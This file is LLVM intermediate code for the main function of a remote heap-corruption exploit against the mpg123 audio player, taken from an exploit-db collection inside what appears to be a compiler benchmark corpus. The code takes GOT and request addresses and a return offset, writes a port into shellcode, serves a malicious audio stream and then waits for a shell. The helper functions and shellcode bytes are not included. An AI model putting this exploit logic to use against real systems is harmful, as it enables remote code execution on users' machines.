; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32, i32, i32 }

@.str = private unnamed_addr constant [5 x i8] c"none\00", align 1
@.str.1 = private unnamed_addr constant [135 x i8] c"[*] mpg123[v0.59r,v0.59s]: remote client-side heap corruption exploit.\0A[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realhalo)\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"p:s:g:r:+:t:l\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@port = common dso_local global i64 0, align 8
@sport = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@gotaddr = common dso_local global i32 0, align 4
@requestaddr = common dso_local global i32 0, align 4
@retoffset = common dso_local global i32 0, align 4
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.4 = private unnamed_addr constant [40 x i8] c"[!] %u is not a valid target, ignored.\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[*] platform value base\09\09: %s.\0A\00", align 1
@.str.6 = private unnamed_addr constant [36 x i8] c"[*] fprintf GOT address\09\09: 0x%.8x.\0A\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"[*] *request address location\09: 0x%.8x.\0A\00", align 1
@.str.8 = private unnamed_addr constant [51 x i8] c"[*] *request offset(+?*4)\09: %u(=%u), ret=0x%.8x.\0A\0A\00", align 1
@x86_exec = common dso_local global i32* null, align 8
@.str.9 = private unnamed_addr constant [21 x i8] c"[!] exploit failed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.1, i64 0, i64 0))
  br label %11

11:                                               ; preds = %93, %2
  %12 = load i32, i32* %4, align 4
  %13 = load i8**, i8*** %5, align 8
  %14 = call i32 @getopt(i32 %12, i8** %13, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  store i32 %14, i32* %7, align 4
  %15 = load i32, i32* @EOF, align 4
  %16 = icmp ne i32 %14, %15
  br i1 %16, label %17, label %94

17:                                               ; preds = %11
  %18 = load i32, i32* %7, align 4
  switch i32 %18, label %88 [
    i32 112, label %19
    i32 115, label %22
    i32 103, label %26
    i32 114, label %29
    i32 43, label %32
    i32 116, label %37
    i32 108, label %86
  ]

19:                                               ; preds = %17
  %20 = load i32, i32* @optarg, align 4
  %21 = call i64 @atoi(i32 %20)
  store i64 %21, i64* @port, align 8
  br label %93

22:                                               ; preds = %17
  %23 = load i32, i32* @optarg, align 4
  %24 = call i64 @atoi(i32 %23)
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* @sport, align 4
  br label %93

26:                                               ; preds = %17
  %27 = load i32, i32* @optarg, align 4
  %28 = call i32 @sscanf(i32 %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* @gotaddr)
  br label %93

29:                                               ; preds = %17
  %30 = load i32, i32* @optarg, align 4
  %31 = call i32 @sscanf(i32 %30, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* @requestaddr)
  br label %93

32:                                               ; preds = %17
  %33 = load i32, i32* @optarg, align 4
  %34 = call i64 @atoi(i32 %33)
  %35 = mul i64 %34, 4
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* @retoffset, align 4
  br label %93

37:                                               ; preds = %17
  store i32 0, i32* %6, align 4
  br label %38

38:                                               ; preds = %46, %37
  %39 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %40 = load i32, i32* %6, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i64 %41
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %42, i32 0, i32 0
  %44 = load i8*, i8** %43, align 8
  %45 = icmp ne i8* %44, null
  br i1 %45, label %46, label %49

46:                                               ; preds = %38
  %47 = load i32, i32* %6, align 4
  %48 = add i32 %47, 1
  store i32 %48, i32* %6, align 4
  br label %38

49:                                               ; preds = %38
  %50 = load i32, i32* @optarg, align 4
  %51 = call i64 @atoi(i32 %50)
  %52 = load i32, i32* %6, align 4
  %53 = zext i32 %52 to i64
  %54 = icmp uge i64 %51, %53
  br i1 %54, label %55, label %59

55:                                               ; preds = %49
  %56 = load i32, i32* @optarg, align 4
  %57 = call i64 @atoi(i32 %56)
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0), i64 %57)
  br label %85

59:                                               ; preds = %49
  %60 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %61 = load i32, i32* @optarg, align 4
  %62 = call i64 @atoi(i32 %61)
  %63 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %60, i64 %62
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %63, i32 0, i32 0
  %65 = load i8*, i8** %64, align 8
  store i8* %65, i8** %9, align 8
  %66 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %67 = load i32, i32* @optarg, align 4
  %68 = call i64 @atoi(i32 %67)
  %69 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %66, i64 %68
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i32 0, i32 1
  %71 = load i32, i32* %70, align 8
  store i32 %71, i32* @gotaddr, align 4
  %72 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %73 = load i32, i32* @optarg, align 4
  %74 = call i64 @atoi(i32 %73)
  %75 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %72, i64 %74
  %76 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %75, i32 0, i32 2
  %77 = load i32, i32* %76, align 4
  store i32 %77, i32* @requestaddr, align 4
  %78 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %79 = load i32, i32* @optarg, align 4
  %80 = call i64 @atoi(i32 %79)
  %81 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %78, i64 %80
  %82 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %81, i32 0, i32 3
  %83 = load i32, i32* %82, align 8
  %84 = mul nsw i32 %83, 4
  store i32 %84, i32* @retoffset, align 4
  br label %85

85:                                               ; preds = %59, %55
  br label %93

86:                                               ; preds = %17
  %87 = call i32 (...) @platform_list()
  br label %93

88:                                               ; preds = %17
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 0
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @usage(i8* %91)
  br label %93

93:                                               ; preds = %88, %86, %85, %32, %29, %26, %22, %19
  br label %11

94:                                               ; preds = %11
  %95 = load i64, i64* @port, align 8
  %96 = icmp ne i64 %95, 0
  br i1 %96, label %102, label %97

97:                                               ; preds = %94
  %98 = load i8**, i8*** %5, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 0
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 @usage(i8* %100)
  br label %102

102:                                              ; preds = %97, %94
  %103 = load i8*, i8** %9, align 8
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i8* %103)
  %105 = load i32, i32* @gotaddr, align 4
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.6, i64 0, i64 0), i32 %105)
  %107 = load i32, i32* @requestaddr, align 4
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0), i32 %107)
  %109 = load i32, i32* @retoffset, align 4
  %110 = sdiv i32 %109, 4
  %111 = load i32, i32* @retoffset, align 4
  %112 = load i32, i32* @requestaddr, align 4
  %113 = load i32, i32* @retoffset, align 4
  %114 = add nsw i32 %112, %113
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.8, i64 0, i64 0), i32 %110, i32 %111, i32 %114)
  %116 = load i32, i32* @sport, align 4
  %117 = and i32 %116, 65280
  %118 = ashr i32 %117, 8
  %119 = load i32*, i32** @x86_exec, align 8
  %120 = getelementptr inbounds i32, i32* %119, i64 33
  store i32 %118, i32* %120, align 4
  %121 = load i32, i32* @sport, align 4
  %122 = and i32 %121, 255
  %123 = load i32*, i32** @x86_exec, align 8
  %124 = getelementptr inbounds i32, i32* %123, i64 34
  store i32 %122, i32* %124, align 4
  %125 = call i8* (...) @audioserver_bind()
  store i8* %125, i8** %8, align 8
  %126 = load i8*, i8** %8, align 8
  %127 = call i32 @getshell(i8* %126)
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  %129 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @atoi(i32) #1

declare dso_local i32 @sscanf(i32, i8*, i32*) #1

declare dso_local i32 @platform_list(...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i8* @audioserver_bind(...) #1

declare dso_local i32 @getshell(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
